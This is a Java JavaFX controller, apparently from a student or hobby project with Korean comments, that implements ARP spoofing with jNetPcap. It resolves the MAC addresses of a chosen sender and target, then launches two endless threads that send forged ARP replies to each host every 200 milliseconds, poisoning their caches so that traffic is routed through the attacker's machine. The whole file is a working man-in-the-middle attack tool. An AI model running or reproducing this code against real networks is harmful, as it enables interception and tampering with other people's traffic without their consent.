package controller;

import java.net.InetAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.ResourceBundle;

import org.jnetpcap.Pcap;
import org.jnetpcap.PcapHeader;
import org.jnetpcap.PcapIf;
import org.jnetpcap.nio.JBuffer;
import org.jnetpcap.nio.JMemory;
import org.jnetpcap.packet.JRegistry;
import org.jnetpcap.packet.PcapPacket;
import org.jnetpcap.protocol.lan.Ethernet;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ListView;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import model.ARP;
import model.Util;

public class Controller implements Initializable{

	@FXML
	private ListView<String> networkListView;
	
	@FXML
	private TextArea textArea;
	
	@FXML
	private Button pickButton;
	
	@FXML
	private TextField myIp;
	
	@FXML
	private TextField senderIp;
	
	@FXML
	private TextField targetIp;
	
	@FXML
	private Button getMacButton;
	
	ObservableList<String> networkList = FXCollections.observableArrayList();
	
	private ArrayList<PcapIf> allDevs = null;
	
	@Override
	public void initialize(URL location, ResourceBundle resource) {
		allDevs = new ArrayList<PcapIf>();
		StringBuilder errbuf = new StringBuilder();
		int r = Pcap.findAllDevs(allDevs, errbuf);
		if(r==Pcap.NOT_OK || allDevs.isEmpty()) {
			textArea.appendText("네트워크 장치를 찾을 수 없음.\n" + errbuf.toString() + "\n");
			return;
		}
		
		textArea.appendText("네트워크 장치 발견.\n원하는 장치를 선택하세요.\n");
		for(PcapIf device : allDevs) {
			networkList.add(device.getName() + " " +
					((device.getDescription() != null) ? device.getDescription() : "설명없음."));
		}
		networkListView.setItems(networkList);
	}
	
	public void networkPickAction() {
		if(networkListView.getSelectionModel().getSelectedIndex() < 0)
			return;
		
		Main.device = allDevs.get(networkListView.getSelectionModel().getSelectedIndex());
		networkListView.setDisable(true);
		pickButton.setDisable(true);
		
		int snaplen = 64 * 1024;
		int flags = Pcap.MODE_PROMISCUOUS;
		int timeout = 1;
		
		StringBuilder errbuf = new StringBuilder();
		Main.pcap = Pcap.openLive(Main.device.getName(), snaplen, flags, timeout, errbuf);
		
		if(Main.pcap == null) {
			textArea.appendText("네트워크 장치를 열 수 없음. \n" + errbuf.toString() + "\n");
			return;
		}
		textArea.appendText("장치선택 : " + Main.device.getName() + "\n");
		textArea.appendText("네트워크 장치를 활성화했습니다.\n");
	}
	
	public void getMacAction() //start 버튼을 눌렀을 때 Mac주소를 가져오는 역할
	{
		if(!pickButton.isDisable()) {
			textArea.appendText("네트워크 장치를 먼저 선택해주세요.\n");
			return;
		}
		
		ARP arp = new ARP(); // 정의한 ARP 라이브러리 사용
		Ethernet eth = new Ethernet();
		PcapHeader header = new PcapHeader(JMemory.POINTER); // 캡처된 패킷의 헤더부분만 사용
		JBuffer buf = new JBuffer(JMemory.POINTER);
		ByteBuffer buffer = null; 
		
		int id = JRegistry.mapDLTToId(Main.pcap.datalink());
		
		try {
			Main.myMac = Main.device.getHardwareAddress(); // 자신의 하드웨어 정보를 담아줌
			Main.myIp = InetAddress.getByName(myIp.getText()).getAddress(); // textField에 적힌 ip를 ip주소 형태롤 변환시켜서 myIp에 담는다.
			Main.senderIp = InetAddress.getByName(senderIp.getText()).getAddress(); // Main에서 선언한 senderIp 변수에 주소 넣기
			Main.targetIp = InetAddress.getByName(targetIp.getText()).getAddress(); // Main에서 선언한 targetIp 변수에 주소 넣기
		}catch(Exception e)
		{
			textArea.appendText("IP주소가 옳지 않음.\n");
			return;
		}
		
		myIp.setDisable(true);
		senderIp.setDisable(true);
		targetIp.setDisable(true);
		getMacButton.setDisable(true);
		
		arp = new ARP();
		arp.makeARPrequest(Main.myMac, Main.myIp, Main.targetIp); // ARP request 패킷 생성
		buffer = ByteBuffer.wrap(arp.getPacket()); // 버퍼에 arp 패킷에 담긴 내용을 담음
		if(Main.pcap.sendPacket(buffer) != Pcap.OK) // 패킷에  담긴 정보에 오류가 있다면..
		{
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("타깃에게 ARP request를 보냄.\n" + 
				Util.bytesToString(arp.getPacket()) + "\n"); // 자신이 보낸 arp request 패킷을 출력.
		
		
		long targetStartTime = System.currentTimeMillis();
		Main.targetMac = new byte[6];
		while(Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) // 패킷의 헤더에 오류를 검사
		{
			if(System.currentTimeMillis() - targetStartTime >= 500) 
			{
				textArea.appendText("타깃이 응답하지 않습니다.");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf);
			packet.scan(id);
			byte[] sourceIp = new byte[4];
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIp, 0, 4); // 28번째 바이트부터 4개의 바이트를 복사하여 패킷사이즈만큼의 크기에 넣어줌
			if(packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06
					&& packet.getByte(20)== 0x00 && packet.getByte(21) == 0x02
					&& Util.bytesToString(sourceIp).equals(Util.bytesToString(Main.targetIp))
					&& packet.hasHeader(eth)) // ARP는 0806, reply는 0002, ip주소가 일치하는지 2계층인지 확인
			{
				Main.targetMac = eth.source(); // 얻어온 맥 주소를 targetMac 주소에 넣는다.
				break;
			} else {
				continue;
			}
		}
		
		textArea.appendText("타깃 맥 주소 : " + 
				Util.bytesToString(Main.targetMac) + "\n");
		
		arp = new ARP();
		arp.makeARPrequest(Main.myMac, Main.myIp, Main.senderIp);
		buffer = ByteBuffer.wrap(arp.getPacket());
		if(Main.pcap.sendPacket(buffer) != Pcap.OK) {
			System.out.println(Main.pcap.getErr());
		}
		textArea.appendText("sender에게 ARP request를 보냄.\n" + 
				Util.bytesToString(arp.getPacket()) + "\n");
		
		long senderStartTime = System.currentTimeMillis();
		Main.senderMac = new byte[6];
		while(Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
			if(System.currentTimeMillis() - senderStartTime >= 500) {
				textArea.appendText("타깃이 응답하지 않습니다.");
				return;
			}
			PcapPacket packet = new PcapPacket(header, buf);
			packet.scan(id);
			byte[] sourceIp = new byte[4];
			System.arraycopy(packet.getByteArray(0, packet.size()), 28, sourceIp, 0, 4);
			if(packet.getByte(12) == 0x08 && packet.getByte(13) == 0x06
					&& packet.getByte(20)== 0x00 && packet.getByte(21) == 0x02
					&& Util.bytesToString(sourceIp).equals(Util.bytesToString(Main.senderIp))
					&& packet.hasHeader(eth)) {
				Main.senderMac = eth.source(); // 얻어온 맥 주소를 targetMac 주소에 넣는다.
				break;
			} else {
				continue;
			}
		}
		
		textArea.appendText("sender 맥 주소 : " + 
				Util.bytesToString(Main.senderMac) + "\n");
		
		new SenderARPSpoofing().start();
		new TargetARPSpoofing().start();
	}
	
	class SenderARPSpoofing extends Thread {
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.senderMac, Main.myMac, Main.myMac, 
					Main.targetIp, Main.senderMac, Main.senderIp);
			
			Platform.runLater(() -> {
				textArea.appendText("센터에게 ARP Reply 패킷을 계속 전송.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				}catch(Exception e)
				{
					e.printStackTrace();
				}
			}
		}
	}
	
	class TargetARPSpoofing extends Thread {
		@Override
		public void run() {
			ARP arp = new ARP();
			arp.makeARPReply(Main.targetMac, Main.myMac, Main.myMac, 
					Main.senderIp, Main.targetMac, Main.targetIp);
			
			Platform.runLater(() -> {
				textArea.appendText("타깃에게 ARP Reply 패킷을 계속 전송.\n");
			});
			while(true) {
				ByteBuffer buffer = ByteBuffer.wrap(arp.getPacket());
				Main.pcap.sendPacket(buffer);
				try {
					Thread.sleep(200);
				}catch(Exception e)
				{
					e.printStackTrace();
				}
			}
		}
	}
}
